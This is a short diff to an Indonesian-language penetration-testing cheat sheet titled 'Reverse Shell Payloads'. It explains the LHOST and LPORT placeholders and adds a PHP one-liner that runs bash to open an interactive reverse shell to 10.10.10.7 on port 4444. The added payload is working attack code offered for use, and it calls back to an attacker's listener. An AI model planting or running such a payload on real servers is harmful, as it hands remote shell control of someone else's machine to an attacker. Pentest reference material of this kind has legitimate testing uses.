@@ -1,7 +1,12 @@
+
 # Reverse Shell Payloads
 
 > **LHOST = IP mesin Kali/pentester yang menjalankan listener.**  
 > **LPORT = Port listener.**
+## Payload sederhana dibanding msfvenom
+```bash
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.7/4444 0>&1'"); ?>
+```
 
 ## Bash
 
